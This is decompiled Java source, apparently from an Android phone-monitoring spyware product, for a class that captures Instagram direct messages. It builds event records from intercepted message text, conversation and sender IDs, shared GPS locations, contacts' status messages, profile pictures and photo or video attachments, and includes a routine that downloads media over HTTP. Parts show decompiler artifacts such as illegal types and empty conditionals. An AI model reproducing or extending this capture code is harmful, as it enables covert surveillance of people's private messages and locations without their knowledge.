        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramInstagramDirectMessageData.b();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.INSTAGRAM.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramInstagramDirectMessageData.f().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject3).<init>();
    localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = paramInstagramDirectMessageData.j();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject5 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject5).<init>();
      localObject6 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject5).b((byte[])localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject5).a((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject5).b((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject5).c((String)localObject6);
      localObject6 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject5).d((String)localObject6);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject5).a((byte[])localObject1);
      ((List)localObject4).add(localObject5);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramInstagramDirectMessageData.a();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    Object localObject5 = MessageType.ShareLocation;
    n = ((MessageType)localObject5).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      float f = paramInstagramDirectMessageData.g().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d = paramInstagramDirectMessageData.g().a();
      ((com.vvt.events.e)localObject1).a(d);
      d = paramInstagramDirectMessageData.g().b();
      ((com.vvt.events.e)localObject1).b(d);
      localObject2 = paramInstagramDirectMessageData.g().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject2 = paramInstagramDirectMessageData.i().a();
    ((FxIMMessageEvent)localObject3).setConversationId((String)localObject2);
    localObject2 = paramInstagramDirectMessageData.d();
    localObject5 = InstagramDirectMessageData.Direction.IN;
    if (localObject2 == localObject5) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject3).setDirection((FxEventDirection)localObject2);
      long l3 = paramInstagramDirectMessageData.b();
      ((FxIMMessageEvent)localObject3).setEventTime(l3);
      i = FxIMMessageServiceType.INSTAGRAM.getValue();
      ((FxIMMessageEvent)localObject3).setImServiceId(i);
      localObject2 = paramInstagramDirectMessageData.c();
      ((FxIMMessageEvent)localObject3).setMessage((String)localObject2);
      localObject2 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject2).<init>();
      ((FxIMMessageEvent)localObject3).setMessageLocation((com.vvt.events.e)localObject2);
      ((FxIMMessageEvent)localObject3).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramInstagramDirectMessageData.a();
      ((FxIMMessageEvent)localObject3).setTextRepresentation(m);
      localObject1 = paramInstagramDirectMessageData.d();
      localObject2 = InstagramDirectMessageData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramInstagramDirectMessageData.h().a();
        ((FxIMMessageEvent)localObject3).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject4).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject3).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject3);
    return localArrayList;
  }
  
  private static com.vvt.im.events.info.a b(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    Object localObject1 = parama.g();
    Object localObject2 = ((h)((i)localObject1).a().a().get(0)).a();
    Object localObject3 = ImMediaFileType.ATTACHMENT;
    localObject3 = a((String)localObject2, paramString, (ImMediaFileType)localObject3);
    localObject2 = ((o)((i)localObject1).c().get(0)).a();
    localObject1 = ImMediaFileType.ATTACHMENT;
    localObject2 = a((String)localObject2, paramString, (ImMediaFileType)localObject1);
    boolean bool2 = com.vvt.ag.b.a((String)localObject2);
    if (!bool2)
    {
      localObject1 = com.vvt.io.d.k((String)localObject2);
      Object localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
      localObject4 = ".mp4";
      localObject1 = (String)localObject4;
      locala.a((String)localObject1);
      locala.c((String)localObject2);
      locala.d((String)localObject3);
      localObject2 = new byte[0];
      locala.b((byte[])localObject2);
      locala.b("video/mp4");
    }
    for (localObject2 = locala;; localObject2 = null)
    {
      boolean bool3 = b;
      if (bool3) {}
      return (com.vvt.im.events.info.a)localObject2;
      bool1 = false;
    }
  }
  
  private static ArrayList b(com.vvt.capture.instagram.directmessage.data.e parame, String paramString)
  {
    boolean bool = b;
    if (bool) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    if ((parame != null) && (paramString != null))
    {
      ArrayList localArrayList2 = (ArrayList)parame.e();
      int i = 0;
      Object localObject1 = null;
      for (int j = 0;; j = i)
      {
        i = localArrayList2.size();
        if (j >= i) {
          break;
        }
        localObject1 = (k)localArrayList2.get(j);
        com.vvt.im.events.info.e locale = new com/vvt/im/events/info/e;
        locale.<init>();
        Object localObject2 = ((k)localObject1).a();
        locale.d((String)localObject2);
        localObject2 = ((k)localObject1).b();
        locale.c((String)localObject2);
        localObject1 = ((k)localObject1).c();
        localObject2 = ImMediaFileType.USER_PROFILE;
        localObject1 = a((String)localObject1, paramString, (ImMediaFileType)localObject2);
        locale.a((String)localObject1);
        localArrayList1.add(locale);
        i = j + 1;
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList1;
  }
  
  /* Error */
  private static byte[] b(String paramString)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: getstatic 23	com/vvt/capture/instagram/directmessage/removeFromPath:removeFromPath	Z
    //   7: istore_3
    //   8: iload_3
    //   9: ifeq +3 -> 12
    //   12: iconst_0
    //   13: newarray <illegal type>
    //   15: astore 4
    //   17: new 738	org/apache/http/impl/client/DefaultHttpClient
    //   20: astore 5
    //   22: aload 5
    //   24: invokespecial 739	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   27: new 741	org/apache/http/client/methods/HttpGet
    //   30: astore 6
    //   32: aload 6
    //   34: aload_0
    //   35: invokespecial 742	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   38: iconst_0
    //   39: istore_1
    //   40: aconst_null
    //   41: astore_2
    //   42: new 744	java/io/ByteArrayOutputStream
    //   45: astore 7
    //   47: aload 7
    //   49: invokespecial 745	java/io/ByteArrayOutputStream:<init>	()V
    //   52: aload 5
    //   54: aload 6
    //   56: invokevirtual 749	org/apache/http/impl/client/DefaultHttpClient:execute	(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    //   59: astore 5
    //   61: aload 5
    //   63: invokeinterface 755 1 0
    //   68: astore 5
    //   70: aload 5
    //   72: invokeinterface 761 1 0
    //   77: astore_2
    //   78: sipush 2048
    //   81: istore 8
    //   83: iload 8
    //   85: newarray <illegal type>
    //   87: astore 5
    //   89: aload_2
    //   90: aload 5
    //   92: invokevirtual 768	java/io/InputStream:read	([B)I
    //   95: istore 9
    //   97: iconst_m1
    //   98: istore 10
    //   100: iload 9
    //   102: iload 10
    //   104: if_icmpeq +51 -> 155
    //   107: iconst_0
    //   108: istore 10
    //   110: aload 7
    //   112: aload 5
    //   114: iconst_0
    //   115: iload 9
    //   117: invokevirtual 772	java/io/ByteArrayOutputStream:write	([BII)V
    //   120: goto -31 -> 89
    //   123: astore 5
    //   125: getstatic 28	com/vvt/capture/instagram/directmessage/removeFromPath:MyUncaughtExceptionHandler	Z
    //   128: istore 8
    //   130: iload 8
    //   132: ifeq +3 -> 135
    //   135: aload_2
    //   136: invokestatic 775	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   139: aload 7
    //   141: invokestatic 778	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   144: getstatic 23	com/vvt/capture/instagram/directmessage/removeFromPath:removeFromPath	Z
    //   147: istore_1
    //   148: iload_1
    //   149: ifeq +3 -> 152
    //   152: aload 4
    //   154: areturn
    //   155: aload 7
    //   157: invokevirtual 781	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   160: astore 4
    //   162: aload_2
    //   163: invokestatic 775	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   166: goto -27 -> 139
    //   169: astore 4
    //   171: aload_2
    //   172: invokestatic 775	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   175: aload 7
    //   177: invokestatic 778	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   180: aload 4
    //   182: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	183	0	paramString	String
    //   1	148	1	bool1	boolean
    //   3	169	2	localInputStream	java.io.InputStream
    //   7	2	3	bool2	boolean
    //   15	146	4	arrayOfByte	byte[]
    //   169	12	4	localObject1	Object
    //   20	93	5	localObject2	Object
    //   123	1	5	localException	Exception
    //   30	25	6	localHttpGet	org.apache.http.client.methods.HttpGet
    //   45	131	7	localByteArrayOutputStream	java.io.ByteArrayOutputStream
    //   81	3	8	i	int
    //   128	3	8	bool3	boolean
    //   95	21	9	j	int
    //   98	11	10	k	int
    // Exception table:
    //   from	to	target	type
    //   54	59	123	java/lang/Exception
    //   61	68	123	java/lang/Exception
    //   70	77	123	java/lang/Exception
    //   83	87	123	java/lang/Exception
    //   90	95	123	java/lang/Exception
    //   115	120	123	java/lang/Exception
    //   155	160	123	java/lang/Exception
    //   54	59	169	finally
    //   61	68	169	finally
    //   70	77	169	finally
    //   83	87	169	finally
    //   90	95	169	finally
    //   115	120	169	finally
    //   125	128	169	finally
    //   155	160	169	finally
  }
  
  private static com.vvt.im.events.info.a c(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    Object localObject1 = ((h)parama.g().a().a().get(0)).a();
    Object localObject2 = ImMediaFileType.ATTACHMENT;
    localObject1 = a((String)localObject1, paramString, (ImMediaFileType)localObject2);
    boolean bool2 = com.vvt.ag.b.a((String)localObject1);
    if (bool2)
    {
      localObject2 = com.vvt.io.d.k((String)localObject1);
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
      localObject3 = ".jpg";
      localObject2 = (String)localObject3;
      locala.a((String)localObject2);
      locala.c((String)localObject1);
      locala.d((String)localObject1);
      localObject1 = new byte[0];
      locala.b((byte[])localObject1);
      locala.b("image/jpeg");
    }
    for (localObject1 = locala;; localObject1 = null)
    {
      boolean bool3 = b;
      if (bool3) {}
      return (com.vvt.im.events.info.a)localObject1;
      bool1 = false;
    }
  }
  
  private static String c(String paramString)
  {
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
    Long localLong = Long.valueOf(d(paramString));
    return localSimpleDateFormat.format(localLong);
  }
  
  private static long d(String paramString)
  {
    return Long.parseLong(paramString) / 1000L;
  }
  
  private static com.vvt.im.events.info.a d(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    Object localObject1 = parama.k().b();
    Object localObject2 = ((h)((i)localObject1).a().a().get(0)).a();
    Object localObject3 = ImMediaFileType.ATTACHMENT;
    localObject3 = a((String)localObject2, paramString, (ImMediaFileType)localObject3);
    localObject2 = ((o)((i)localObject1).c().get(0)).a();
    localObject1 = ImMediaFileType.ATTACHMENT;
    localObject2 = a((String)localObject2, paramString, (ImMediaFileType)localObject1);
    boolean bool2 = com.vvt.ag.b.a((String)localObject2);
    if (!bool2)
    {
      localObject1 = com.vvt.io.d.k((String)localObject2);
      Object localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
      localObject4 = ".mp4";
      localObject1 = (String)localObject4;
      locala.a((String)localObject1);
      locala.c((String)localObject2);
      locala.d((String)localObject3);
      localObject2 = new byte[0];
      locala.b((byte[])localObject2);
      locala.b("video/mp4");
    }
    for (localObject2 = locala;; localObject2 = null)
    {
      boolean bool3 = b;
      if (bool3) {}
      return (com.vvt.im.events.info.a)localObject2;
      bool1 = false;
    }
  }
  
  private static com.vvt.im.events.info.a e(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    Object localObject1 = ((h)parama.k().b().a().a().get(0)).a();
    Object localObject2 = ImMediaFileType.ATTACHMENT;
    localObject1 = a((String)localObject1, paramString, (ImMediaFileType)localObject2);
    boolean bool2 = com.vvt.ag.b.a((String)localObject1);
    if (!bool2)
    {
      localObject2 = com.vvt.io.d.k((String)localObject1);
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
      localObject3 = ".jpg";
      localObject2 = (String)localObject3;
      locala.a((String)localObject2);
      locala.c((String)localObject1);
      locala.d((String)localObject1);
      localObject1 = new byte[0];
      locala.b((byte[])localObject1);
      locala.b("image/jpeg");
    }
    for (localObject1 = locala;; localObject1 = null)
    {
      boolean bool3 = b;
      if (bool3) {}
      return (com.vvt.im.events.info.a)localObject1;
      bool1 = false;
    }
  }
  
  private static com.vvt.im.events.info.f f(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    Object localObject1 = parama.b();
    String str1 = ((n)localObject1).a();
    String str2 = ((n)localObject1).c();
    localObject1 = ((n)localObject1).b();
    Object localObject2 = ImMediaFileType.USER_PROFILE;
    localObject1 = a((String)localObject1, paramString, (ImMediaFileType)localObject2);
    localObject2 = new com/vvt/im/events/info/f;
    ((com.vvt.im.events.info.f)localObject2).<init>();
    ((com.vvt.im.events.info.f)localObject2).b(str1);
    ((com.vvt.im.events.info.f)localObject2).a(str2);
    ((com.vvt.im.events.info.f)localObject2).e((String)localObject1);
    boolean bool = b;
    if (bool) {}
    return (com.vvt.im.events.info.f)localObject2;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */